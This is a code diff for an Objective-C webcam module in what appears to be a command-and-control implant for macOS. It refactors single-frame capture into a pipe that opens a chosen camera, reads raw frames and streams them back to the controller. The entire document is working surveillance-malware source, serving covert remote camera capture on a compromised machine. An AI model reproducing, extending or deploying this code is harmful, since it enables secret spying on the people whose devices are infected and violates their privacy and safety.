@@ -36,22 +36,15 @@
 
 #define CAM_BASE 5
 
-#define CAM_FRAME \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       CAM_BASE, \
-                       API_CALL)
 #define CAM_LIST \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        CAM_BASE, \
-                       API_CALL + 1)
-#define CAM_START \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       CAM_BASE, \
-                       API_CALL + 2)
-#define CAM_STOP \
-        TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       CAM_BASE, \
-                       API_CALL + 3)
+                       API_CALL)
+
+#define CAM_PIPE \
+        TLV_PIPE_CUSTOM(PIPE_STATIC, \
+                        CAM_BASE, \
+                        PIPE_TYPE)
 
 #define TLV_TYPE_CAM_ID TLV_TYPE_CUSTOM(TLV_TYPE_INT, CAM_BASE, API_TYPE)
 
@@ -63,6 +56,9 @@
 
 @interface Cam ()
 {
+    CVImageBufferRef head;
+    AVCaptureSession *session;
+    int count;
 }
 
 -(BOOL)start:(int)deviceIndex;
@@ -71,11 +67,6 @@
 @end
 
 @implementation Cam
-
-Cam *cam;
-CVImageBufferRef head;
-AVCaptureSession *session;
-int count;
 
 -(id)init
 {
@@ -219,26 +210,6 @@ int count;
 
 @end
 
-static tlv_pkt_t *cam_frame(c2_t *c2)
-{
-    NSData *frame;
-    tlv_pkt_t *result;
-
-    @autoreleasepool
-    {
-        frame = [cam getFrame];
-
-        if (frame != nil)
-        {
-            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
-            tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)frame.bytes, frame.length);
-            return result;
-        }
-    }
-
-    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
-}
-
 static tlv_pkt_t *cam_list(c2_t *c2)
 {
     char *name;
@@ -270,9 +241,10 @@ static tlv_pkt_t *cam_list(c2_t *c2)
     return result;
 }
 
-static tlv_pkt_t *cam_start(c2_t *c2)
+static int cam_create(pipe_t *pipe, c2_t *c2)
 {
     int camID;
+    Cam *cam;
     NSData *frame;
 
     tlv_pkt_get_u32(c2->request, TLV_TYPE_CAM_ID, &camID);
@@ -281,35 +253,85 @@ static tlv_pkt_t *cam_start(c2_t *c2)
     {
         cam = [[Cam alloc] init];
 
-        if ([cam start:camID])
+        if (![cam start:camID])
         {
-            return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+            return -1;
         }
-        else
-        {
-            cam = nil;
-        }
+
+        pipe->data = (void *)CFBridgingRetain(cam);
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    return 0;
 }
 
-static tlv_pkt_t *cam_stop(c2_t *c2)
+static int cam_readall(pipe_t *pipe, void **buffer)
 {
+    Cam *cam;
+    NSData *frame;
+    tlv_pkt_t *result;
+
     @autoreleasepool
     {
+        log_debug("* Entered cam_readall()\n");
+        cam = CFBridgingRelease(pipe->data);
+
+        log_debug("* Released cam_readall()\n");
+        frame = [cam getFrame];
+
+        log_debug("* Framed cam_readall()\n");
+
+        if (frame == nil)
+        {
+            pipe->data = (void *)CFBridgingRetain(cam);
+            return -1;
+        }
+
+        *buffer = calloc(1, frame.length);
+
+        if (*buffer == NULL)
+        {
+            log_debug("* Failed alloc cam_readall()\n");
+            return -1;
+        }
+
+        log_debug("* Copied cam_readall()\n");
+        memcpy(*buffer, frame.bytes, frame.length);
+
+        log_debug("* Retailed cam_readall()\n");
+        pipe->data = (void *)CFBridgingRetain(cam);
+
+        log_debug("* Exited cam_readall()\n");
+        return frame.length;
+    }
+}
+
+static int cam_destroy(pipe_t *pipe, c2_t *c2)
+{
+    Cam *cam;
+
+    @autoreleasepool
+    {
+        cam = CFBridgingRelease(pipe->data);
         [cam stop];
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+    return 0;
 }
 
 void register_cam_api_calls(api_calls_t **api_calls)
 {
-    api_call_register(api_calls, CAM_FRAME, cam_frame);
     api_call_register(api_calls, CAM_LIST, cam_list);
-    api_call_register(api_calls, CAM_START, cam_start);
-    api_call_register(api_calls, CAM_STOP, cam_stop);
+}
+
+void register_cam_api_pipes(pipes_t **pipes)
+{
+    pipe_callbacks_t callbacks;
+
+    callbacks.create_cb = cam_create;
+    callbacks.readall_cb = cam_readall;
+    callbacks.destroy_cb = cam_destroy;
+
+    api_pipe_register(pipes, CAM_PIPE, callbacks);
 }
 
 #endif
